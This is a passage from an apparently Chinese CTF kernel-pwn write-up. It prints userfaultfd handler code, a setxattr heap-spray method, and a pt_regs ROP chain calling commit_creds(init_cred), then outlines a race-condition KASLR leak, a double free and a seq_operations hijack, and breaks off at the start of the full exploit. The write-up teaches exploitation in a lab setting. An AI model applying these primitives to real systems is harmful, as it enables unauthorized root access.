O_CLOEXEC | O_NONBLOCK); <span class="comment">/* 生成一个userfaultfd */</span></span><br><span class="line"></span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">/* 用户空间将在UFFD上使用READ/POLLIN协议 */</span></span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr;</span><br><span class="line">    ur.range.len = len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">/* 调用UFFDIO_REGISTER ioctl完成注册 */</span></span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd); <span class="comment">/* 启动一个用以进行轮询的线程uffd monitor,该线程会通过poll函数(Linux中的字符设备驱动中的一个函数)不断轮询直到出现缺页异常 */</span></span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当有一个线程（faulting 线程）在这块内存区域内触发缺页异常时，该线程会进入到内核中处理缺页异常</li>
<li>随后 faulting 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 发送给轮询线程（monitor 线程），等待其处理结束</li>
<li>monitor 线程调用通过 ioctl 处理缺页异常（调用函数指针 handler 所指向的函数）</li>
<li>在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作</li>
</ul>
<p>函数 handler 的模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    </span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>); <span class="comment">/* 调用poll函数轮询直到出现缺页异常 */</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)); <span class="comment">/* 通过userfaultfd读取缺页信息 */</span></span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg error!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        errExit(<span class="string">&quot;[-] mmap page error!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ...... (核心功能)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);;</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>根据实际需求不同，handler 函数可能会有所不同</li>
</ul>
<p><strong>setxattr</strong></p>
<p>setxattr 在 kernel 中可以为我们提供近乎任意大小的内核空间 object 分配</p>
<ul>
<li>调用链如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr() -&gt; path_setxattr() -&gt; setxattr()</span><br></pre></td></tr></table></figure>
<ul>
<li>核心代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL); <span class="comment">/* 分配object */</span></span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123; <span class="comment">/* 向内核写入内容 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue); <span class="comment">/* 释放object */</span></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么这里 setxattr 系统调用便提供给我们这样一条调用链：</p>
<ul>
<li>在内核空间分配 object</li>
<li>向 object 内写入内容</li>
<li>释放分配的 object</li>
</ul>
<p>这里的 value 和 size 都是由我们来指定的，即我们可以分配任意大小的 object 并向其中写入内容</p>
<p><strong>堆占位</strong></p>
<p>堆占位技术就是用 setxattr 和 userfaultfd 配合使用得来的，可以在内核空间中分配任意大小的 object 并写入任意内容 </p>
<p>在 setxattr 的执行流程，其中会调用 <code>copy_from_user</code> 从用户空间拷贝数据，通过这一点可以构造出如下的利用：</p>
<ul>
<li>我们通过 mmap 分配连续的两个页面：<ul>
<li>在第二个页面上启用 userfaultfd 监视</li>
<li>在第一个页面的末尾写入我们想要的数据</li>
</ul>
</li>
<li>此时我们调用 setxattr 进行跨页面的拷贝，当 <code>copy_from_user</code> 拷贝到第二个页面时便会触发 userfaultfd</li>
<li>从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用</li>
</ul>
<p>堆占位一般用于 UAF 漏洞，当内核产生 UAF 堆块时，可以用堆占位技术将一个 object 放入其中，之后通过 UAF 漏洞就可以操控这个 object</p>
<p><strong>pt_regs</strong></p>
<p>在 <code>entry_SYSCALL_64</code> 这一用汇编写的函数内部，用如下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYS</span><br></pre></td></tr></table></figure>
<ul>
<li>将所有的寄存器压入内核栈上，形成一个 <code>pt_regs</code> 结构体，该结构体实质上位于内核栈底</li>
<li><code>pt_regs</code> 结构体的条目如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在内核中的结构如下图：</p>
<p><img src="/2023/02/01/userfaultfd+setxattr+pt_regs/1675218563307.png" alt="1675218563307"> </p>
<p>在系统调用当中有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，这些寄存器为我们的 ROP 提供了可能，我们只需要寻找到一条形如 <code>add rsp,val; ret</code> 的 gadget 便能够完成 ROP</p>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, 0xabcddcba;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, add_rsp_0x40_ret;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, init_cred;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1145141919;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, 0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, 0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">arg#0 - seq_fd</span></span><br><span class="line"><span class="comment">arg#1 - rsp</span></span><br><span class="line"><span class="comment">syscall num - 0</span></span><br><span class="line"><span class="comment">返回地址</span></span><br><span class="line"><span class="comment">arg#2 - 8</span></span><br><span class="line"><span class="comment">arg#4 - 0x88888888</span></span><br><span class="line"><span class="comment">arg#5 - 0x99999999</span></span><br><span class="line"><span class="comment">arg#3 - swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line"><span class="comment">r11 - 0x1145141919</span></span><br><span class="line"><span class="comment">rbx - pop_rdi_ret</span></span><br><span class="line"><span class="comment">rbp - init_cred</span></span><br><span class="line"><span class="comment">r12 - commit_creds</span></span><br><span class="line"><span class="comment">r13 - add_rsp_0x40_ret</span></span><br><span class="line"><span class="comment">r14 - 0xabcddcba</span></span><br><span class="line"><span class="comment">r15 - 0xbeefdead</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以在调试时慢慢调整</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>首先需要绕开 kaslr，泄露内核基地址</p>
<p>由于本题目有条件竞争漏洞，于是我们可以在 PUSH 命令把用户态节点指针拷贝到内核之前，用另一个线程把该指针只向的数据释放掉</p>
<p>另外可以使用 userfaultfd 来增加条件竞争的几率：</p>
<ul>
<li>使用 PUSH 让分配线程先申请一个堆块 buf，然后在 <code>copy_from_user</code> 这里卡住</li>
<li>接着执行 userfaultfd 线程，由于 <code>copy_from_user</code> 没有执行完毕，所以在 PUSH 中生成的 <code>buf-&gt;value</code> 指针没有初始化</li>
</ul>
<p>于是我们可以事先申请一个用于泄露的 object 然后释放掉，用 PUSH 中的 <code>kmem_cache_alloc</code> 复用这个堆块，然后在 <code>copy_from_user</code> 触发 userfaultfd 线程后执行一次 POP，于是 <code>object-&gt;value</code> 就被输出到用户态缓存中了</p>
<p>程序中的 buf 使用如下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Element struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_3)</span><br><span class="line"><span class="number">00000000</span> pid dq ?</span><br><span class="line"><span class="number">00000008</span> value dq ?</span><br><span class="line"><span class="number">00000010</span> ptr dq ?                                ; offset</span><br><span class="line"><span class="number">00000018</span> Element ends</span><br></pre></td></tr></table></figure>
<ul>
<li>成员 value 的偏移为 0x8</li>
</ul>
<p>由于 <code>kmem_cache_alloc(kmalloc_caches[5], 0x6000C0LL)</code> 使用 kmallc-32，并且我们可以泄露偏移为 0x8 的指针，于是使用 <code>shm_file_data</code> 来作为 object：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中可以读取的 ns 域刚好指向内核 <code>.text</code> 段，由此我们可以泄露出内核基址 </li>
</ul>
<p>可以在通过 <code>shmget</code> 系统调用创建共享内存之后，使用 <code>shmat</code> 系统调用获得该结构体，然后通过 <code>shmdt</code> 我们可以释放该结构体</p>
<p>在 POP 时通过 <code>copy_to_user</code> 触发 userfaultfd，在 userfaultfd 线程中再 POP 一次，就可以构造出 Double free（使内核模块申请的 UAF 堆块被释放两次，在 kmalloc-32 当中的第一个 object 指向自身，接下来的两次分配中我们都将会获得同一个 object）</p>
<p>最后需要用堆占位技术来劫持 <code>seq_operations</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>调用 <code>setxattr</code> 函数，在 <code>copy_from_user</code> 触发 userfaultfd 线程后，采用常规的 pt_regs 来完成 ROP </p>
<p>具体的步骤如下：</p>
<ul>
<li>打开 <code>/proc/self/stat</code> 分配大量 <code>seq_operations</code> 结构体做备用 </li>
<li>完成内核基地址泄露和 Double free 的构造</li>
<li>用 mmap 分配两 page 大小的内存，在第一个 page 最后8字节写上 magic gadget</li>
<li>打开 <code>/proc/self/stat</code> 使 <code>seq_operations</code> 结构体占用 UAF 堆块</li>
<li>执行 <code>setxattr</code>，分配一个堆块复用 <code>seq_operations</code> 结构体，然后触发 userfaultfd</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kvalue = kvmalloc(size, GFP_KERNEL); <span class="comment">/* 分配object */</span></span><br><span class="line"><span class="keyword">if</span> (!kvalue)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123; <span class="comment">/* 向内核写入内容 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后使用 pt_regs 来完成并触发 ROP</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 